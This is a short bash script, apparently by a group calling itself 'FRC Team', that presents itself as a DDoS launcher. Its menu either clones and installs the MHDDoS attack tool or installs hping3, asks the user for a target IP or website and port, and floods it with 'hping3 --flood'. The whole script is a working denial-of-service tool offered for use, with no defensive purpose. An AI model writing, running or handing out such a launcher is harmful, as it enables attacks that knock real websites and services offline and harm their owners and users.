echo '______________________________     _________            .__        __'
echo '\_   _____/\______   \_   ___ \   /   _____/ ___________|__|______/  |_ '
echo ' |    __)   |       _/    \  \/   \_____  \_/ ___\_  __ \  \____ \   __\'
echo ' |     \    |    |   \     \____  /        \  \___|  | \/  |  |_> >  |  '
echo ' \___  /    |____|_  /\______  / /_______  /\___  >__|  |__|   __/|__|  '
echo '     \/            \/        \/          \/     \/         |__|       '  
echo '                            DDOSERS'
echo '                  Made by: Mysterek # FRC Team'
sleep 2
clear
echo 'Installing prerequisites..'
echo '# DONE #'
clear
sleep 2
PS3='Your Choice: '
options=("MHDDoS" "hping3" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "MHDDoS")
            echo "Choice 1 | MHDDoS"
			apt install git
			git clone https://github.com/MHProDev/MHDDoS
			echo Installed..
			sleep 2
			clear
			echo Installing prerequisites
			cd MHDDoS
			apt install python3.7 -y
			pip install -r requirements.txt
			echo "MHDDoS config is not supported in version 1.2. Update! | github.com/mysterek1337"
			break
            ;;
        "hping3")
            echo "Choice 2 | hping3"
			apt install hping3
			clear
			echo "So, what you want to DDoS today?"
			echo "IP, or Website:"
			read ip
			echo "Port:"
			read port
			clear
			echo "Starting hping3 on $ip:$port"
			hping3 --flood $ip -p $port
			break
            ;;
        "Quit")
            break
            ;;
        *) echo "invalid option $REPLY";;
    esac
done